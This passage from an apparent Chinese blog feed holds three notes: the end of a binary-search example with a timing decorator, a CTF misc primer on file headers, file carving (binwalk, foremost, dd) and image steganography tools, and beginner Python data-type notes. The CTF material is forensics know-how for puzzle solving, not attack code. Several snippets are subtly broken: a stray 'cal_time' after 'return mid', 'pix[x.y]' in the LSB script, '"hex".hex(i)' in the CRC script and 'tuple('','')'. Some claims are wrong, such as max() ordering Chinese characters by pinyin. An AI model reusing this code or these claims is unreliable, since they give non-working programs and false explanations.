class="line-numbers language-python" data-language="python"><code class="language-python">import timedef cal_time(func):    def wrapper(*args,**kwargs):        t1 = time.time()        result = func(*args,**kwargs)        t2 = time.time()        print("%s running time: %s secs." % (func.__name__,t2-t1))        return result    return wrapper# 运用时，先导入这个模块，再用@cal_time语句放在函数代码，如：@cal_timedef binary_search(li,val):   # val：元素    left = 0    right = len(li) - 1    while left &lt;= right:# 候选区有值        mid = (left + right)// 2        if li[mid] == val:            return midcal_time        elif li[mid] &gt; val: # 带查找的值在mid左侧            right = mid -1        else:   # li[mid] &lt; val 带查找的值在mid右侧            left = mid + 1      else:             return None<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注：内置函数 index() 用的是线性查找。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构与算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>misc的基本解题思路(一)</title>
      <link href="/posts/b478.html"/>
      <url>/posts/b478.html</url>
      
        <content type="html"><![CDATA[<p><strong>misc的四大部分：</strong></p><ul class="lvl-0"><li class="lvl-2">文件操作与隐写</li><li class="lvl-2">图片隐写术</li><li class="lvl-2">压缩文件处理</li><li class="lvl-2">流量取证技术</li></ul><h2 id="文件操作与隐写">文件操作与隐写</h2><h3 id="文件类型识别">文件类型识别</h3><ol><li class="lvl-3"><p>File命令</p><p>当文件没有后缀名或者有后缀名而无法打开时，根据识别出的文件类型来修改后缀名即可正常打开文件。</p><p><mark>使用场景：不知道后缀名，无法打开文件</mark></p><p><code>Linux环境下命令格式：file+文件名</code></p></li><li class="lvl-3"><p>winhex</p><p>通过<mark>winhex</mark>程序中可以查看文件头类型，根据头类型判断文件类型</p><p><mark>使用场景：windows下通过文件头信息判断文件类型</mark></p></li></ol><p><strong>常见的文件头类型如下：</strong></p><table><thead><tr><th>文件类型</th><th>文件头</th></tr></thead><tbody><tr><td>JPEG(jpg)</td><td>FFD8FFE1</td></tr><tr><td>PNG(png)</td><td>89504E47</td></tr><tr><td>GIF(gif)</td><td>47494638</td></tr><tr><td>TIFF(tiff)</td><td>49492A00</td></tr><tr><td>Windows Bitmap(bmp)</td><td>424DC001</td></tr><tr><td>ZIP Archive(ZIP)</td><td>504B0304</td></tr><tr><td>RAR Archive(rar)</td><td>52617221</td></tr><tr><td>Adobe Photshop(psd)</td><td>38425053</td></tr><tr><td>Rich Text Format(rtf)</td><td>7B5C727466</td></tr><tr><td>XML(xml)</td><td>3C3F786D6C</td></tr><tr><td>HTML(html)</td><td>68746D6C3E</td></tr><tr><td>Adobe Acrobat(pdf)</td><td>255044462D312E</td></tr><tr><td>Wave(wav)</td><td>57415645</td></tr><tr><td>pacp</td><td>4D3C2B1A</td></tr></tbody></table><ol start="3"><li class="lvl-3"><p>文件头残缺/错误</p><p>通常文件无法正常打开有两种情况，一种文件头部残缺，另一种头部字段错误。针对文件头部残缺的情况，使用winhex程序添加相应的文件头，针对头部字段错误，可以找一个相同类型的文件进行替换。</p><p><mark>使用场景：文件头部残缺或文件头部字段错误无法打开正常文件</mark></p><p><code>格式：file 文件名</code></p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202302011320661.png" alt=""></p></li></ol><h3 id="文件分离操作">文件分离操作</h3><ol><li class="lvl-3"><p><strong>Binwalk工具</strong></p><p><strong>Binwalk</strong>工具是Linux下用来分析和分离文件的工具，可以快速分辨文件是否由多个文件合并而成，并将文件进行分离。如果分离成功会在目标文件的目录。</p><p>同目录下生成一个形如_文件名_extracted的文件目录，目录中有分离后的文件。</p><p><mark>用法</mark>：</p><p><code>分析文件：binwalk filename</code></p><p><code>分离文件：binwalk -e filename</code></p><blockquote><p>注：binwalk遇到压缩包会自动解压。</p></blockquote></li><li class="lvl-3"><p><strong>formost</strong></p><p>如果<strong>binwalk</strong>无法正确分离文件，可以使用<strong>foremost</strong>，将目标文件复制到kali中，成功执行后，会在目标文件的文件目录下生成我们设置的目录，目录中会按文件类型分离出文件。</p><p><mark>用法</mark>：</p><p><code>foremost 文件名 -o 输出目录名</code></p></li><li class="lvl-3"><p><strong>dd</strong></p><p>当文件自动分离出错或者因为其他原因无法自动分离时，可以使用<strong>dd</strong>实现文件手动分离。</p><p><code>格式：dd if=源文件 of=目标文件名 bs=1 skip=开始分离的字节数</code></p><p><mark>参数说明</mark>：</p><p><code>if=file  #输入文件名，缺省为标准输入</code></p><p><code>of=file  #输出文件名，缺省为标准输出</code></p><p><code>bs=bytes  #同时设置读写块的大小为bytes，可代替ibs和obs</code></p><p><code>skip=blocks  #从输入文件开头跳过blocks个块后再开始复制</code></p></li><li class="lvl-3"><p><strong>Winhex</strong></p><p>除了使用dd外，还可以使用winhex实现文件手动分离，将目标文件拖入问winhex中，找到要分离的部分，点击复制即可。</p><p><mark>使用场景：Windows下利用winhex程序对文件进行手动分离</mark></p></li><li class="lvl-3"><p><strong>010Editor</strong></p><p><mark>将某块区域文件保存的方式如下：</mark></p><ol><li class="lvl-6"><p>010Editor打开文件 -&gt; 选中右键 -&gt; Selection -&gt; Save Selection</p></li></ol><p><mark>将16进制字符文件导入保存操作方法如下：</mark></p><ol><li class="lvl-6"><p>将16进制字符文件保存在一个文件</p></li><li class="lvl-6"><p>打开010Editor import Hex</p></li><li class="lvl-6"><p>另存为一个文件，后缀名以010Editor获取到它本身文件信息而定</p></li></ol></li></ol><h3 id="文件合并操作">文件合并操作</h3><ol><li class="lvl-3"><p><strong>Linux下的文件合并</strong></p><p><mark>使用场景：Linux下，通常对文件名相似的文件要进行批量合并</mark></p><p><code>格式：cat 合并的文件 &gt; 输出的文件</code></p><p><mark>完整性检测：Linux下计算文件md5：</mark></p><p><code>md5sum 文件名</code></p></li><li class="lvl-3"><p><strong>Windows下的文件合并</strong></p><p><mark>使用场景：Windows下，通常要对文件 名相似的文件进行批量合并</mark></p><p><code>格式：copy /B 合并的文件 输出的文件命令</code></p><p><mark>完整性检测：Windows下计算文件md5：</mark></p><p><code>certutil -hashfiel 文件名 md5</code></p></li></ol><h3 id="文件内容隐写">文件内容隐写</h3><p>文件内容隐写，就是直接将KEY以十六进制的形式写在文件中，通常在文件的开头或结尾部分，<mark>分析时通常重点观察文件开头和结尾部分</mark>。如果在文件中间部分，通常搜索关键字<strong>KEY</strong>或者<strong>flag</strong>来查找隐藏内容。</p><p><mark>使用场景：Windows下，搜索隐写的文件内容</mark></p><ol><li class="lvl-3"><p>winhex/010Editor</p><p>通常将识别的文件拖入<strong>winhex</strong>中，查找具有关键字或明显与文件不和谐的部分，通常优先观察文件首部和尾部，搜索flag或key等关键字，最后拖动滚轮寻找。</p></li><li class="lvl-3"><p>Notepad++</p><p>使用<strong>Notepad++<strong>打开文件，查看文件头尾是否有含有关键字的字符串，搜索</strong>flag</strong>或<strong>key</strong>等关键字，最后拖动滚轮寻找。</p><p>另外通过安装插件HEX-Editor可以实现winhex的功能</p></li></ol><h2 id="图片隐写术">图片隐写术</h2><h3 id="图片隐写的常见隐写方法">图片隐写的常见隐写方法</h3><ol><li class="lvl-3"><p><strong>细微的颜色差别</strong></p></li><li class="lvl-3"><p><strong>GIF图多帧隐藏</strong></p><ol><li class="lvl-6">颜色通道隐藏</li><li class="lvl-6">不同帧图信息隐藏</li><li class="lvl-6">不同帧对比隐写</li></ol></li><li class="lvl-3"><p><strong>Exif信息隐藏</strong></p></li><li class="lvl-3"><p><strong>图片修复</strong></p><ol><li class="lvl-6">图片头修复</li><li class="lvl-6">图片尾修复</li><li class="lvl-6">CRC校验修复</li><li class="lvl-6">长、宽、高度修复</li></ol></li><li class="lvl-3"><p><strong>最低有效位LSB隐写</strong></p></li><li class="lvl-3"><p><strong>图片加密</strong></p><ol><li class="lvl-6">Stedetect</li><li class="lvl-6">outguess</li><li class="lvl-6">F5</li></ol></li></ol><h3 id="图片文件隐写">图片文件隐写</h3><ol><li class="lvl-3"><p><strong>Firework</strong></p><p>使用<strong>winhex</strong>打开文件时会看到文件头部中包含f<strong>irework</strong>的标识，通过<strong>firework</strong>可以找到隐藏图片。</p><p><mark>使用场景：查看隐写的图片文件</mark></p></li><li class="lvl-3"><p><strong>Exif</strong></p><p><strong>Exif</strong>按照JPEG的规格在JPEG中插入一些图像/数字相机的信息数据以及缩略图像，可以通过与JPEG兼容的互联浏览器/图片浏览器/图片处理等一些软件来查看<strong>Exif</strong>格式的图片文件，就跟浏览器通常JPEG图像文件一样。</p><p>图片右键属性，查看Exif或查看详细信息，在相关选项卡中看找flag信息。</p><p>如果是Linux环境下，可以用<strong>exiftool</strong>工具，<code>命令：exiftool 文件名（带后缀名）</code></p></li><li class="lvl-3"><p><strong>Stegsolve</strong></p><p>当两张图片外观、大小、像素都基本相同时，可以考虑进行结合分析，即将两个文件的像素RGB值进行XOR、ADD、SUB等操作，看能否得到有用的信息，Stegsolve可以方便地进行这些操作。</p><p><mark>使用场景：两张图片信息基本相同</mark></p><ol><li class="lvl-6"><p>打开第一张图片，点击analyse -&gt; Image combiner</p></li><li class="lvl-6"><p>在弹出的窗口中点击左右按钮选择处理方式，点击save保存有价值的结果</p></li></ol></li><li class="lvl-3"><p><strong>LSB（最低有效位Least Significant Bit)</strong></p><p><strong>LSB</strong>替换隐写基本思想是用嵌入的秘密信息取代载体图像的最低特位，原来的7个高位平面与替代秘密信息的最低位平面组合成含有隐藏信息的新图形。</p><ol><li class="lvl-6"><p>像素三原色（RGB）</p></li><li class="lvl-6"><p>通过修改像素中最低位的1bit来达到隐藏的效果</p></li><li class="lvl-6"><p>工具：stegsolve、zsteg、wbstego4、python脚本</p></li><li class="lvl-6"><p><strong>Stegsolve.jar工具</strong></p><ol><li class="lvl-9">打开文件 -&gt; Analyse -&gt; Data Extract</li><li class="lvl-9">调整Bit Plans，Bits Order，Bit Plane Order</li></ol></li><li class="lvl-6"><p><strong>zsteg工具</strong></p><p><mark>检测LSB隐写：</mark></p><p><code>命令：zsteg xxx.png</code></p></li><li class="lvl-6"><p><strong>wbstego4工具</strong></p><p>解密通过1sb加密的图片</p></li><li class="lvl-6"><p><strong>python脚本来处理</strong></p><p>将目标文件放在以下脚本目录下，将脚本中的文件名修改为你的目标文件名，运行python脚本即可</p><blockquote><p>注：要在python2的环境运行。</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python">#coding:utf-8import PIL.Imagedef foo():    im = PIL.Image.open('01.bmp')  #将'01.bmp'修改为你的目标文件名     im2 = im.copy()    pix = im2.load()    width,height = im2.size        for x in xrange(0,width):        for y in xrange(0,height):            if pix[x.y]&amp;0x1 == 0:                pix[x,y] = 0            else:                pix[x,y] = 255    im2.show()    passif __name__=='__main__':    foo()    print 'ok.'    pass<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol></li><li class="lvl-3"><p>TTweakPNG</p><p><strong>TweakPNG</strong>是一款简单易用的PNG图像浏览工具，它允许查看和修改一些PNG图像文件的元信息存储。</p><p><mark>使用场景：文件头正常却无法打开文件，利用TweakPNG修CRC</mark></p><p>例：</p><ol><li class="lvl-6"><p>当PNG文件头正常但无法打开文件，可能是CRC校验出错，可以尝试通过TweakPNG打开PNG，会弹出校验错误的提示，这里显示CRC是fe1a5ab6，正确的是b0a7a9f1。打开winhex搜索fe1a5ab6将其改为b0a7a9f1</p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202302011629751.png" alt=""></p></li></ol><p><mark>有时CRC没有错误，但是图片的高度或者宽度发生了错误，需要通过CRC计算出正确的高度或者宽度。</mark></p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202302011652177.png" alt=""></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">#cooding:utf-8import binasciiimport structcrcbp = open("xxx.png","rb").read()  # 此处将'xxx.png'改成你的目标文件名for i in range(1024):    for j in range(1024):        data = crcbp[12:16]+struct.pack('&gt;i',i)+struct.pack('&gt;i',j)+crcbp[24:29]        crc32 = binascii.crc32(data)&amp;0xffffffff        if crc32 == 0x08ec7edb:  # 此处填上CRC值            print i,j            print "hex".hex(i),hex(j)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li class="lvl-3"><p><strong>Bftools</strong></p><p><strong>bftools</strong>用于解密图片信息</p><p><mark>使用场景：在Windows的cmd下，对加密过的图片文件进行解密</mark></p><p><code>格式：Bftools.exe decode braincopter 要解密的图片名称 -output 输出文件名</code></p><p><code>Bftools.exe run 上一步输出的文件</code></p><p><img src="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202302011703200.png" alt=""></p></li><li class="lvl-3"><p><strong>SilentEye</strong></p><p><strong>silenteye</strong>是一款可以将文字或者文件隐藏到图片的解密工具。</p><p><mark>使用场景：Windows下打开silentEye工具，对加密的图片进行解密</mark></p><p>例：</p><ol><li class="lvl-6"><p>使用silentEye程序打开目标图片，点击image -&gt; decode，点击decode，可以查看隐藏文件，点击保存即可</p></li></ol></li><li class="lvl-3"><p>JPG图像加密</p><ol><li class="lvl-6"><p><strong>Stegdetect</strong>工具探测加密方式</p><blockquote><p>Stegdetect程序主要用于分析JPEG文件。因此用Stegdetect可以检测到通过JSteg、JPHide、OutGuess、Invisble Secrets、F5、appendx和Camoutflage等这些隐写工具隐藏的信息。</p></blockquote><p><code>Linux环境下命令：</code></p><p><code>stegdetect xxx,jpg</code></p><p><code>stegdetect -s 敏感度 xxx.jpgexi</code></p></li><li class="lvl-6"><p><strong>Jphide</strong></p><p><strong>Jphide</strong>是基于最低有效位LSB的JPEG格式图像隐写算法。</p><p>例：</p><p>Stegdetect提示jphide加密时，可以用Jphs工具进行解密，打开jphswin.exe，使用open jpeg打开图片，点击seek，输入密码和确认密码，在弹出文件框中选择要保存的解密文件位置即可，结果保存成txt文件。</p></li><li class="lvl-6"><p><strong>Outguess</strong></p><p><strong>Outguess</strong>一般用于解密文件信息</p><p><mark>使用场景：Stegdetect识别出来或者题目提示时outguess加密的图片</mark></p><p><code>格式：outguess -r 要解密的文件名输出结果文件名</code></p></li><li class="lvl-6"><p><strong>F5</strong></p><p><strong>F5</strong>一般用于解密文件信息</p><p><mark>使用场景：Stegdetect识别出来是F5加密的图片或题目提示是F5加密的图片</mark></p><p>进入F5-steganography_F5目录，将图片文件拷贝至该目录下，从CMD进入该目录</p><p><code>格式：Java Exrtact 要解密的文件名 -p 密码</code></p></li></ol></li><li class="lvl-3"><p><strong>二维码处理</strong></p><ol><li class="lvl-6">使用二维码扫描工具CQR.exe打开图片，找到内容字段</li><li class="lvl-6">如果二维码某个定位角被覆盖了，该工具有时候也可以自动识别，如果识别失败，需要使用PS或画图工具将另外几个角的定位符移动到相应的位置，补全二维码。</li><li class="lvl-6">如果某个二维码的定位点中间是白色，可能被反色了，使用画图工具把颜色反色回来再扫描即可。</li></ol></li></ol><blockquote><p>免责声明：本文章涉及的知识和技能仅用于学习研究，如有用于非法途径或未被授权的真实网络环境，所造成的后果自行承担，责任与本文作者无关，倡导把安全知识和技能用于正当、正规、正义的途径。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python数据类型</title>
      <link href="/posts/bb2d.html"/>
      <url>/posts/bb2d.html</url>
      
        <content type="html"><![CDATA[<h2 id="python数据类型概况">python数据类型概况</h2><p><strong>数字类型</strong></p><p><strong>字符类型</strong></p><p><strong>布尔类型</strong></p><p><strong>空类型</strong></p><p><strong>列表类型</strong></p><p><strong>元组类型</strong></p><p><strong>字典类型</strong></p><h3 id="整型int">整型int</h3><ul class="lvl-0"><li class="lvl-2"><p>整型就是所说的整数，0也是整数，但是特殊的整数</p></li><li class="lvl-2"><p><mark>int</mark>即是整型的代表，又是定义整型的<mark>内置函数</mark></p></li></ul><h3 id="浮点型">浮点型</h3><ul class="lvl-0"><li class="lvl-2"><p>浮点型就是我们生活中的小数，凡是带有小数点的类型，都可以认为是浮点型</p></li><li class="lvl-2"><p>在python中，<mark>float</mark>既是浮点型的代表，又是浮点型类型定义的内置函数</p></li><li class="lvl-2"><p>定义<mark>float</mark>类型的时候，并不需要一定使用<mark>float</mark>声明</p></li></ul><h3 id="内置函数–type">内置函数–type</h3><ul class="lvl-0"><li class="lvl-2"><p>返回变量的类型</p></li><li class="lvl-2"><p><mark>type</mark>（已经被赋值的变量名或变量）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">count = 1050print(type(count))print(type(3.1415926))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="字符串">字符串</h3><ul class="lvl-0"><li class="lvl-2"><p>用 " 或者 “” 包裹的信息，就是字符串</p></li><li class="lvl-2"><p>字符串中可以包含任意字符：如字母，数字，符号，且没有先后顺序</p></li></ul><h4 id="字符串的定义方法">字符串的定义方法</h4><p>在python中，使用<mark>str</mark>来代表字符串类型，并且通过该函数可以定义字符串</p><h4 id="字符串的重要思想">字符串的重要思想</h4><ul class="lvl-0"><li class="lvl-2"><p>字符串是不可改变的！</p></li></ul><h4 id="内置函数id">内置函数id</h4><ul class="lvl-0"><li class="lvl-2"><p>返回变量的内存地址</p></li><li class="lvl-2"><p>数字地址 = <mark>id</mark>(变量)</p></li></ul><h4 id="内置函数">内置函数</h4><ul class="lvl-0"><li class="lvl-2"><p>返回字符串的长度</p></li><li class="lvl-2"><p>无法返回数字类型的长度，因为数字类型没有长度</p></li><li class="lvl-2"><p>返回 = len(字符串)</p></li></ul><h4 id="内置成员运算符in的使用">内置成员运算符<mark>in</mark>的使用</h4><ul class="lvl-0"><li class="lvl-2"><p>成员运算符是用来判断你的数据中是否存在你想要的成员</p></li></ul><h4 id="内置函数max">内置函数<mark>max</mark></h4><ul class="lvl-0"><li class="lvl-2"><p><mark>max</mark>(数据) -&gt; 成员值     <code>print(max(''今天是1月3日!'))</code>    -&gt; <mark>月</mark></p></li><li class="lvl-2"><p><strong>规则</strong>：中文符号 &gt; 字母 &gt; 数字 &gt; 英文符号</p></li><li class="lvl-2"><p>中文按照拼音的首字母来计算</p></li></ul><h4 id="内置函数min">内置函数<mark>min</mark></h4><ul class="lvl-0"><li class="lvl-2"><p><mark>min</mark>函数返回数据中最小的成员  <code>pinrt(min('今天是1月3日!'))</code>  -&gt; !</p></li><li class="lvl-2"><p>min(数据) &gt; 字母 &gt; 数字 &gt; 英文符号</p></li><li class="lvl-2"><p><strong>规则</strong>：中文符号 &gt; 字母 &gt; 数字 &gt; 英文符号</p></li><li class="lvl-2"><p>中文按照拼音的首字母来计算</p></li></ul><h4 id="字符串的累加">字符串的累加</h4><ul class="lvl-0"><li class="lvl-2"><p>字符串不是数字不能做减法，乘除法</p></li><li class="lvl-2"><p>字符串的拼接，用 “+” 这个符号</p></li></ul><h3 id="布尔类型">布尔类型</h3><ul class="lvl-0"><li class="lvl-2"><p>定义：真假的判断 即 布尔类型</p></li><li class="lvl-2"><p>固定值：True -&gt; 真；False -&gt; 假；</p></li><li class="lvl-2"><p>布尔值</p></li></ul><h4 id="布尔类型的使用">布尔类型的使用</h4><ul class="lvl-0"><li class="lvl-2"><p><mark>bool</mark>代表布尔类型，也可以对于结果进行真假的判读</p></li></ul><h4 id="使用场景">使用场景</h4><ul class="lvl-0"><li class="lvl-2"><p>常被用来判断一件事儿的真假</p></li></ul><h4 id="数字与字符串的布尔应用">数字与字符串的布尔应用</h4><ul class="lvl-0"><li class="lvl-2"><p>int 0 -&gt; False，非0 -&gt; True</p></li><li class="lvl-2"><p>float 0.0 -&gt; False，非0.0 -&gt; True</p></li><li class="lvl-2"><p>str " -&gt; False(即 空字符串)，非空字符串 -&gt; True</p></li><li class="lvl-2"><p>在计算机中0 1是计算机的最原始形态，单个占空间也最小，故而经常会将0 1用来替代True与False</p></li></ul><h3 id="pyhton中的空类型">pyhton中的空类型</h3><ul class="lvl-0"><li class="lvl-2"><p>不属于任何数据类型就是<mark>空类型</mark></p></li><li class="lvl-2"><p>固定值：<mark>None</mark></p></li><li class="lvl-2"><p>空类型 属于 <mark>False</mark>的范畴</p></li><li class="lvl-2"><p>如果不确定类型的时候可以使用<mark>空类型</mark></p></li></ul><h3 id="列表类型">列表类型</h3><ul class="lvl-0"><li class="lvl-2"><p>列表就是队列</p></li><li class="lvl-3"><p>他是各种数据类型的集合，也是一种数据结构</p></li><li class="lvl-2"><p>列表是一种有序，且内容可重复的集合类型</p></li></ul><h4 id="列表的定义">列表的定义</h4><ul class="lvl-0"><li class="lvl-2"><p>在python中，<mark>list</mark>代表这种类型，也可以用它定义一个列表  <code>name_01=list(['',''])</code></p></li><li class="lvl-2"><p>在python中，列表中的元素存在于一个[]中  <code>name_02=['','']</code></p></li><li class="lvl-2"><p>在python中，列表是一个无限制长度的数据结构</p></li></ul><h4 id="列表中的类型">列表中的类型</h4><ul class="lvl-0"><li class="lvl-2"><p><strong>str_array</strong></p></li><li class="lvl-2"><p><strong>int_array</strong></p></li><li class="lvl-2"><p><strong>float_array</strong></p></li><li class="lvl-2"><p><strong>bool_array</strong></p></li><li class="lvl-2"><p><strong>list_array</strong>  列表中嵌套列表</p></li><li class="lvl-2"><p><strong>min_array</strong>  列表中可以放混合类型</p></li></ul><h4 id="in，max，min在列表中的使用">in，max，min在列表中的使用</h4><ul class="lvl-0"><li class="lvl-2"><p>1 in [1,2,3,4] -&gt; True; 10 in  [1,2,3,4] -&gt; False</p></li><li class="lvl-2"><p>max([1,2,3,4]) -&gt; 4</p></li><li class="lvl-2"><p>min([1,2,3,4]) -&gt; 1</p></li><li class="lvl-2"><p>max和min在列表中使用的时候，列表中的元素不能是多种类型，如果类型不统一，则会报错</p></li></ul><h3 id="元组">元组</h3><ul class="lvl-0"><li class="lvl-2"><p>元组和列表一样，都是一种可以存储多种数据结构的队列</p></li><li class="lvl-2"><p>元组也是一个有序的，且元素可以重复的集合</p></li></ul><h4 id="元组的定义">元组的定义</h4><ul class="lvl-0"><li class="lvl-2"><p>在python中，tuple代表着元组这种类型，也可以用它定义一个元组   <code>name_01=tuple('','')</code></p></li><li class="lvl-2"><p>在python中，元组中的元素存在于一个（）小括号中  <code>name_02=('','')</code></p></li><li class="lvl-2"><p>在python中，元组是一个无限制长度的数据结构</p></li></ul><blockquote><p>注：如果元组中只有一个元素，那一定要在这个元素后面加上一个逗号</p></blockquote><h4 id="列表与元组的区别">列表与元组的区别</h4><ul class="lvl-0"><li class="lvl-2"><p>元组比列表占用资源更小</p></li><li class="lvl-2"><p>列表是可变的，元组是不可变的</p></li></ul><h4 id="元组中的类型">元组中的类型</h4><ul class="lvl-0"><li class="lvl-2"><p><strong>str_tuple</strong></p></li><li class="lvl-2"><p><strong>int_tuple</strong></p></li><li class="lvl-2"><p><strong>float_tuple</strong></p></li><li class="lvl-2"><p><strong>bool_tuple</strong></p></li><li class="lvl-2"><p><strong>none_tuple</strong>=(None,None,None)</p></li><li class="lvl-2"><p><strong>tuple_tuple</strong>=((1,2,3),(1.2,3.1))</p></li><li class="lvl-2"><p><strong>list_type</strong>=([123,456],[6789,1234])</p></li><li class="lvl-2"><p><strong>mix_tuple</strong>=(‘’,1,3.14,None,True)</p></li><li class="lvl-2"><p><strong>tuple_array</strong>=[(‘a’,‘b’),(‘c’,‘d’),(‘e’,)]</p></li></ul><h4 id="in，max，min在元组中的使用">in，max，min在元组中的使用</h4><ul class="lvl-0"><li class="lvl-2"><p>1 in （1，2，3，4） -&gt; True；10 not in （1，2，3，4） -&gt; True</p></li><li class="lvl-2"><p>max((1,2,3,4)) -&gt; 4</p></li><li class="lvl-2"><p>min((1,2,3,4)) -&gt; 1</p></li><li class="lvl-2"><p>max和min在元组中使用的时候，元组中的元素不能是多种类型，如果类型不统一，则会报错</p></li></ul><h3 id="字典类型">字典类型</h3><ul class="lvl-0"><li class="lvl-2"><p>字典是由多个键（key）及其对应的值（value）所组成的一种数据类型</p></li></ul><h4 id="字典的结构与创建方法">字典的结构与创建方法</h4><ul class="lvl-0"><li class="lvl-2"><p>在python中，<mark>dict</mark>用来代表字典，并且可以创建一个字典</p></li><li class="lvl-2"><p>在python中，通过{}将一个个key与value存入字典中</p><p><code>a = dict()</code></p><p><code>a = {}</code></p><p><code>person = {'name':'xiaoming','age':33}</code></p></li></ul><h4 id="字典支持的数据类型">字典支持的数据类型</h4><ul class="lvl-0"><li class="lvl-2"><p>key支持字符串，数字和元组类型，但列表是不支持的</p></li><li class="lvl-2"><p>value支持所有python的数据类型</p><p><code>a = {'name':'dewei','age':30}</code></p><p><code>b = {1:'one',2:'two'}</code></p><p><code>c = {(1,2,3):[1,2,3],(4,5,6):[4,5,6]}</code></p></li></ul><h4 id="列表与元组中的字典">列表与元组中的字典</h4><ul class="lvl-0"><li class="lvl-2"><p>dict_array = [{1:1,2:2},{‘one’:1,‘two’:2}]</p></li><li class="lvl-2"><p>dict_tuple = ({1:1,2:2},{‘one’:1,"two’:2})</p></li><li class="lvl-2"><p><mark>元组一旦创建，就不可以改变</mark></p></li></ul><h4 id="python3-7与之前版本-字典的区别">python3.7与之前版本 字典的区别</h4><ul class="lvl-0"><li class="lvl-2"><p>python3.7之前是无序的</p></li><li class="lvl-2"><p>python3.7之后是有序的</p></li></ul><h4 id="字典的重要特性">字典的重要特性</h4><ul class="lvl-0"><li class="lvl-2"><p>字典中每一个key一定是唯一的</p></li></ul><h3 id="数字的运算">数字的运算</h3><h4 id="赋值运算符">赋值运算符</h4><table><thead><tr><th>运算符</th><th>描述</th><th>举例</th></tr></thead><tbody><tr><td>=</td><td>等于运算符</td><td>c=a+b</td></tr><tr><td>+=</td><td>加法运算符</td><td>c+=a -&gt; c=c+a</td></tr><tr><td>-=</td><td>减法运算符</td><td>c-=a -&gt; c=c-a</td></tr><tr><td>*=</td><td>乘法运算符</td><td>c*=a  -&gt;  c=c * a</td></tr><tr><td>/=</td><td>除法运算符</td><td>c/=a -&gt; c=c/a</td></tr><tr><td>%=</td><td>取模运算符</td><td>c%=a -&gt; c=c%a</td></tr><tr><td>**=</td><td>幂运算符</td><td>c ** =a -&gt; c=c ** a</td></tr><tr><td>//=</td><td>整除运算符</td><td>c//=a -&gt; c=c//a</td></tr></tbody></table><h4 id="b-kb-mb-gb-的转换">b kb mb gb 的转换</h4><ul class="lvl-0"><li class="lvl-2"><p>b kb mb gb 是计算机的计量单位</p></li><li class="lvl-2"><p>1024相差量</p></li></ul><h4 id="字符串与数字的乘法">字符串与数字的乘法</h4><ul class="lvl-0"><li class="lvl-2"><p>字符串无法与字符串做乘法</p></li><li class="lvl-2"><p>字符串只可以和数字作乘法</p></li></ul><h3 id="比较运算符">比较运算符</h3><table><thead><tr><th>运算符</th><th>描述</th><th>举例</th></tr></thead><tbody><tr><td>==</td><td>判断是否等于</td><td>a==b</td></tr><tr><td>!=</td><td>判断是否不等于</td><td>a!=b</td></tr><tr><td>&gt;</td><td>判断是否大于</td><td>a&gt;b</td></tr><tr><td>&lt;</td><td>判断是否小于</td><td>a&lt;b</td></tr><tr><td>&gt;=</td><td>判断是否大于等于</td><td>a&gt;=b</td></tr><tr><td>&lt;=</td><td>判断是否小于等于</td><td>a&lt;=b</td></tr><tr><td><mark>&lt;&gt;</mark></td><td><mark>判断是否不等于</mark></td><td>a&lt;&gt;b</td></tr><tr><td>is</td><td>判断两个对象存储单元是否相同</td><td>a is b</td></tr><tr><td>is not</td><td>判断两个对象存储单元是否不同</td><td>a is not b</td></tr></tbody></table><blockquote><p>注：&lt;&gt;在python3里已经废弃，仅python2里可用</p><p>​       <mark>单元存储</mark> 就是我们提过的<mark>内存块</mark></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的第一篇博客文章</title>
      <link href="/posts/3eeb.html"/>
      <url>/posts/3eeb.html</url>
      
